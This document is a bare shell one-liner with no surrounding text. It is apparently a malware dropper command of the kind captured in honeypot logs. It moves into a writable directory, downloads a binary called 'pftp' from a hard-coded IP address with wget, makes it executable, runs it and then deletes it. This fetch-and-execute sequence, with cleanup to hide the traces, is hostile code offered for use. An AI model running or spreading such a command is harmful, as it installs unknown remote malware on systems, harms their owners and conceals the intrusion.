cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.98.203/pftp; chmod +x pftp; ./pftp; rm -rf pftp
